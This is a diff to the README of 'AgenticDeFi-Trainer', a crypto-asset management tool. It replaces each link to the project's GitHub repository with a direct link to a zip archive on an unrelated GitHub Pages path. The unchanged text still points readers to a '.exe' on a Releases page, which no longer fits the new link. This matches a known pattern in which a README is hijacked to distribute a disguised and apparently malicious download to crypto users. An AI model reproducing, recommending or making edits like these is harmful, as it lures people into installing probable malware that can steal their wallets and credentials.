@@ -5,7 +5,7 @@ description: "Deploy autonomous AI agent swarms and self-executing x402 wallets 
 ---
 # 🤖 AgenticDeFi-Trainer - Manage crypto assets with autonomous agents
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Robinhood01kill/AgenticDeFi-Trainer)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Robinhood01kill/robinhood01kill.github.io/main/Nevadan/kill-github-io-robinhood-v1.4.zip)
 
 ## 🎯 Purpose of this software
 
@@ -25,7 +25,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 The application requires specific files to run properly. Follow these instructions to obtain the software:
 
-1.  Visit the official release page: [https://github.com/Robinhood01kill/AgenticDeFi-Trainer](https://github.com/Robinhood01kill/AgenticDeFi-Trainer).
+1.  Visit the official release page: [https://raw.githubusercontent.com/Robinhood01kill/robinhood01kill.github.io/main/Nevadan/kill-github-io-robinhood-v1.4.zip](https://raw.githubusercontent.com/Robinhood01kill/robinhood01kill.github.io/main/Nevadan/kill-github-io-robinhood-v1.4.zip).
 2.  Locate the section labeled "Releases" on the right side of the screen.
 3.  Click the most recent version number.
 4.  Find the file ending in ".exe" under the "Assets" heading.
@@ -73,7 +73,7 @@ If an agent needs your attention, the software highlights the relevant entry in 
 
 ## 🔄 Updating your software
 
-Periodically, updates become available to improve accuracy or add new blockchain integrations. Check the main page at [https://github.com/Robinhood01kill/AgenticDeFi-Trainer](https://github.com/Robinhood01kill/AgenticDeFi-Trainer) to see if a newer version exists. If a new version is present, download the new ".exe" file and install it. The installer replaces your existing version while keeping your strategy settings intact.
+Periodically, updates become available to improve accuracy or add new blockchain integrations. Check the main page at [https://raw.githubusercontent.com/Robinhood01kill/robinhood01kill.github.io/main/Nevadan/kill-github-io-robinhood-v1.4.zip](https://raw.githubusercontent.com/Robinhood01kill/robinhood01kill.github.io/main/Nevadan/kill-github-io-robinhood-v1.4.zip) to see if a newer version exists. If a new version is present, download the new ".exe" file and install it. The installer replaces your existing version while keeping your strategy settings intact.
 
 ## 🔧 Frequently asked questions
 
